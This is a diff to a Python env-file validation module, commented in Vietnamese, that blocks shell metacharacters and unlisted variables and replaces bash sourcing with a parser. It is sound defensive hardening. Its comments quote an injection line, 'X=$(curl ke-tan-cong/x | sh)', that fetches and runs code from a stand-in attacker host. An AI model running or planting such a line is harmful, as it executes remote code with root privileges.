@@ -111,6 +111,21 @@ class CutoverRefused(Exception):
     """Mot phep khang dinh that bai. Luon fail closed."""
 
 
+#: Ky tu KHONG BAO GIO duoc phep nam trong mot gia tri env.
+#:
+#: Tep env nay tung duoc `bash` doc bang `. <(...)`, va khi do mot dong nhu
+#: `X=$(curl ke-tan-cong/x | sh)` chay bang ROOT. Duong `bash source` da bi
+#: go bo (Python doc thang tep bang `doc_env_text`), nhung danh sach nay
+#: van o day lam LOP THU HAI: khong bao gio de mot gia tri co hinh dang
+#: chay duoc di qua, ke ca khi mot ngay nao do co nguoi them lai mot duong
+#: sourcing.
+#:
+#: Xuong dong nam trong danh sach vi mot ly do rieng: `\n` trong gia tri se
+#: TACH thanh mot dong moi trong tep env, tuc la them mot bien khong ai
+#: kiem — chinh la duong ma F1 di qua.
+KY_TU_CAM = ("$", "`", "\n", "\r", "\\", ";", "|", "&", "<", ">", "\0")
+
+
 def _sach(v: Optional[str]) -> str:
     """Chuan hoa mot gia tri env: bo khoang trang va \\r cua CRLF.
 
@@ -135,6 +150,31 @@ def phan_loai_bucket(bucket: Optional[str]) -> str:
 def thieu_bien(env: Mapping[str, str]) -> List[str]:
     """Ten cac bien bat buoc dang thieu hoac rong. Chi TEN, khong gia tri."""
     return [n for n in REQUIRED_ENV_NAMES if not _sach(env.get(n))]
+
+
+def bien_nguy_hiem(env: Mapping[str, str]) -> List[str]:
+    """Ten cac bien co gia tri chua ky tu chay duoc. Chi TEN, khong gia tri.
+
+    Quet **toan bo** tep, khong chi `REQUIRED_ENV_NAMES` — mot bien LA
+    (`X=$(...)`) van la mot dong trong tep env, va do dung la cach ban dau
+    khang dinh bo sot no.
+    """
+    xau: List[str] = []
+    for ten, gt in env.items():
+        v = gt or ""
+        if any(c in v for c in KY_TU_CAM):
+            xau.append(ten)
+    return sorted(xau)
+
+
+def bien_ngoai_danh_sach(env: Mapping[str, str]) -> List[str]:
+    """Ten cac bien KHONG nam trong `REQUIRED_ENV_NAMES`.
+
+    Tep env cua worker production duoc SINH RA tu allowlist, nen mot bien
+    la o day nghia la co ai do da chen them — khong phai mot cau hinh hop
+    le bi bo quen.
+    """
+    return sorted(set(env) - set(REQUIRED_ENV_NAMES))
 
 
 def khang_dinh_production(env: Mapping[str, str]) -> None:
@@ -178,6 +218,31 @@ def khang_dinh_production(env: Mapping[str, str]) -> None:
             f"allowlist (production={PROD_R2_BUCKET!r})")
 
 
+def khang_dinh_tep_env(env: Mapping[str, str]) -> None:
+    """Khang dinh cho mot TEP env production. Nghiem ngat hon `os.environ`.
+
+    Hai phep kiem chi co y nghia voi mot TEP — `os.environ` cua bat ky tien
+    trinh nao cung co PATH/HOME/... nen ap chung o do se tu choi moi thu:
+
+      1. **khong bien nao ngoai allowlist.** Tep nay duoc SINH RA tu
+         `REQUIRED_ENV_NAMES`, nen mot bien la nghia la co ai do chen them.
+      2. **khong gia tri nao chua ky tu chay duoc.**
+
+    Ca hai deu la hau qua truc tiep cua mot lo hong that: tep tung duoc
+    `bash` doc bang `. <(...)` bang ROOT, va bo phan tich thi BO QUA moi
+    dong khong co `=`. Nen `curl ke-tan-cong/x | sh` di lot qua kiem duyet
+    roi chay. Duong `source` da bi go bo; hai phep kiem nay la lop thu hai.
+    """
+    xau = bien_nguy_hiem(env)
+    if xau:
+        raise CutoverRefused(f"gia tri chua ky tu chay duoc o: {', '.join(xau)}")
+    la = bien_ngoai_danh_sach(env)
+    if la:
+        raise CutoverRefused(
+            f"bien ngoai allowlist trong tep env production: {', '.join(la)}")
+    khang_dinh_production(env)
+
+
 def khang_dinh_khong_phai_production(env: Mapping[str, str]) -> None:
     """Chieu NGUOC LAI: tep env nay phai KHONG tro vao production.
 
@@ -185,15 +250,18 @@ def khang_dinh_khong_phai_production(env: Mapping[str, str]) -> None:
     do env staging bi ghi de bang gia tri production thi hai worker se
     tranh claim job THAT — che do that bai nguy hiem nhat cua ca ke hoach.
     """
-    bucket = phan_loai_bucket(env.get("R2_BUCKET"))
-    project = _sach(env.get("APPWRITE_PROJECT_ID"))
-    if bucket == "production":
+    if phan_loai_bucket(env.get("R2_BUCKET")) == "production":
         raise CutoverRefused(
             "env nay tro vao bucket PRODUCTION nhung dang duoc dung cho staging")
-    if project == PROD_APPWRITE_PROJECT_ID:
-        raise CutoverRefused(
-            "env nay tro vao du an Appwrite PRODUCTION nhung dang duoc dung "
-            "cho staging")
+    # Doi xung voi `khang_dinh_production`: kiem CA BON toa do, khong chi
+    # hai. Mot ban kiem nguoc thieu ve la mot ban kiem che giau sai cau
+    # hinh thay vi bat no.
+    for ten, gt_prod in (("APPWRITE_PROJECT_ID", PROD_APPWRITE_PROJECT_ID),
+                         ("APPWRITE_DATABASE_ID", PROD_APPWRITE_DATABASE_ID),
+                         ("APPWRITE_ENDPOINT", PROD_APPWRITE_ENDPOINT)):
+        if _sach(env.get(ten)) == gt_prod:
+            raise CutoverRefused(
+                f"env nay co {ten} cua PRODUCTION nhung dang duoc dung cho staging")
 
 
 def kiem_unit_production(unit: str) -> None:
@@ -242,6 +310,22 @@ def doc_env_text(noi_dung: str) -> Dict[str, str]:
     return ra
 
 
+def nap_env_tu_tep(duong_dan) -> Dict[str, str]:
+    """Doc mot tep env va tra ve map da KIEM.
+
+    Thay cho `. <(tr -d '\\r' < tep)` cua bash. Do la mot khac biet an
+    toan, khong phai mot khac biet phong cach: `bash source` **thuc thi**
+    noi dung tep, nen mot dong `X=$(...)` — hoac bat ky dong nao khong co
+    `=` — chay bang chinh quyen cua tien trinh dang doc, o day la root.
+    Python chi PHAN TICH tep, khong bao gio chay no.
+    """
+    from pathlib import Path as _P
+
+    env = doc_env_text(_P(duong_dan).read_text(encoding="utf-8", errors="replace"))
+    khang_dinh_tep_env(env)
+    return env
+
+
 def render_env_text(env: Mapping[str, str], ten: Iterable[str] = REQUIRED_ENV_NAMES) -> str:
     """Sinh noi dung tep env, LF thuan, ket thuc bang mot dong moi.
 
@@ -253,5 +337,8 @@ def render_env_text(env: Mapping[str, str], ten: Iterable[str] = REQUIRED_ENV_NA
         v = _sach(env.get(k))
         if not v:
             raise CutoverRefused(f"khong the sinh env: {k} rong")
+        if any(c in v for c in KY_TU_CAM):
+            # Khong bao gio in `v` — no co the la mot bi mat.
+            raise CutoverRefused(f"khong the sinh env: {k} chua ky tu chay duoc")
         dong.append(f"{k}={v}")
     return "\n".join(dong) + "\n"
